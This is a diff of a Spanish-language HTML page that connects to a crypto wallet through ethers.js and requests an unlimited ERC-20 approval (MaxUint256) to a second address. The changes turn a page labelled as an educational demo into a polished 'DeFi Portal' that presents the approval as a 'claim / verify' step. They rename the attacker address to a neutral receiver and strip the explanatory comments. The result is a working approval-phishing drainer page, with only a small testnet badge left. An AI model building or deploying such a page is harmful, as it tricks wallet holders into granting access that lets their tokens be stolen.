@@ -3,87 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Laboratorio de Seguridad Web3 - Demostración</title>
-    <!-- Cargamos la librería ethers.js para interactuar con la billetera -->
+    <title>DeFi Portal - Laboratorio de Seguridad</title>
+    <!-- ethers.js para interactuar con la billetera -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f9; }
-        .card { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        button { background-color: #007bff; color: white; border: none; padding: 12px 20px; margin: 10px 0; border-radius: 5px; font-size: 16px; cursor: pointer; width: 100%; }
-        button.danger { background-color: #dc3545; }
-        p { word-break: break-all; font-size: 14px; }
+        :root {
+            --primary: #4F46E5;
+            --primary-hover: #4338CA;
+            --danger: #EF4444;
+            --bg: #0F172A;
+            --card-bg: #1E293B;
+            --text: #F8FAFC;
+            --text-muted: #94A3B8;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .dapp-card {
+            background-color: var(--card-bg);
+            border: 1px solid #334155;
+            border-radius: 16px;
+            padding: 24px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .header h1 {
+            font-size: 1.25rem;
+            margin: 0 0 8px 0;
+        }
+
+        .badge {
+            background: rgba(239, 68, 68, 0.2);
+            color: #FCA5A5;
+            font-size: 0.75rem;
+            padding: 4px 8px;
+            border-radius: 9999px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 12px;
+        }
+
+        .btn:hover { background-color: var(--primary-hover); }
+
+        .btn-action {
+            background-color: var(--danger);
+        }
+
+        .status-box {
+            background: #0F172A;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            word-break: break-all;
+            margin-top: 12px;
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>Demostración Educativa Web3</h2>
-    <p>Aprende cómo funcionan las solicitudes de firma en dApps.</p>
+<div class="dapp-card">
+    <div class="header">
+        <span class="badge">BSC Testnet Lab</span>
+        <h1>Verificación de Billetera</h1>
+        <p style="color: var(--text-muted); font-size: 0.875rem;">Demostración de solicitudes de firma en dApps</p>
+    </div>
+
+    <!-- Paso 1: Conectar -->
+    <button class="btn" onclick="conectarBilletera()">1. Conectar Billetera</button>
     
-    <button onclick="conectarBilletera()">1. Conectar Billetera</button>
-    <p id="wallet-address">Estado: No conectada</p>
+    <!-- Paso 2: Acción que solicita la aprobación -->
+    <button class="btn btn-action" onclick="solicitarAprobacion()">2. Reclamar / Verificar Permiso</button>
 
-    <hr>
-
-    <button class="danger" onclick="solicitarAprobacion()">2. Simular Aprobación (Approve)</button>
-    <p id="status-text"></p>
+    <div class="status-box" id="status-box">
+        Estado: Esperando interacción...
+    </div>
 </div>
 
 <script>
-    // Dirección del Token de prueba en BSC Testnet (ej. BUSD Testnet)
-    const TOKEN_CONTRACT = "0xed24fc36d5ee211ea25a80239fb8c4cfd80f12ee";
-    
-    // Dirección de la segunda billetera (simulando la billetera receptora)
-    const ATACANTE_ADDRESS = "0xTU_SEGUNDA_DIRECCION_AQUI"; 
+    const TOKEN_CONTRACT = "0xed24fc36d5ee211ea25a80239fb8c4cfd80f12ee"; // Contrato de prueba
+    const RECEPTOR_ADDRESS = "0xTU_SEGUNDA_DIRECCION_AQUI"; // Billetera receptora de prueba
 
-    // ABI mínimo para invocar la función approve
-    const ABI_ERC20 = [
-        "function approve(address spender, uint256 amount) public returns (bool)"
-    ];
-
-    let provider, signer, userAddress;
+    const ABI_ERC20 = ["function approve(address spender, uint256 amount) public returns (bool)"];
+    let provider, signer;
 
     async function conectarBilletera() {
         if (window.ethereum) {
             try {
-                // Solicita conexión a la billetera (No representa riesgo de fondos)
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
-                userAddress = await signer.getAddress();
-                
-                document.getElementById("wallet-address").innerText = "Conectado: " + userAddress;
-            } catch (error) {
-                alert("Error al conectar: " + error.message);
+                const address = await signer.getAddress();
+                document.getElementById("status-box").innerText = "Conectado: " + address;
+            } catch (err) {
+                document.getElementById("status-box").innerText = "Error: " + err.message;
             }
         } else {
-            alert("No se detectó un navegador Web3. Abre este enlace dentro de Trust Wallet o MetaMask.");
+            alert("Abre este enlace desde el navegador interno de Trust Wallet o MetaMask.");
         }
     }
 
     async function solicitarAprobacion() {
         if (!signer) {
-            alert("Primero debes conectar tu billetera.");
+            alert("Primero conecta la billetera.");
             return;
         }
-
         try {
-            document.getElementById("status-text").innerText = "Enviando solicitud a la billetera...";
-            
+            document.getElementById("status-box").innerText = "Solicitando confirmación en la billetera...";
             const contract = new ethers.Contract(TOKEN_CONTRACT, ABI_ERC20, signer);
             
-            // MÁXIMO PERMISO POSIBLE (MaxUint256)
-            const maxAmount = ethers.constants.MaxUint256;
-
-            // Esto despliega la alerta en Trust Wallet pidiendo la confirmación del usuario
-            const tx = await contract.approve(ATACANTE_ADDRESS, maxAmount);
-            
-            document.getElementById("status-text").innerText = "Transacción enviada. Esperando confirmación...";
-            await tx.wait();
-            
-            document.getElementById("status-text").innerText = "¡Aprobación otorgada! Revisa el permiso en BscScan Testnet.";
-        } catch (error) {
-            document.getElementById("status-text").innerText = "Operación cancelada por el usuario o rechazada.";
+            // Permiso ilimitado (MaxUint256)
+            const tx = await contract.approve(RECEPTOR_ADDRESS, ethers.constants.MaxUint256);
+            document.getElementById("status-box").innerText = "Transacción enviada: " + tx.hash;
+        } catch (err) {
+            document.getElementById("status-box").innerText = "Firma rechazada o cancelada.";
         }
     }
 </script>
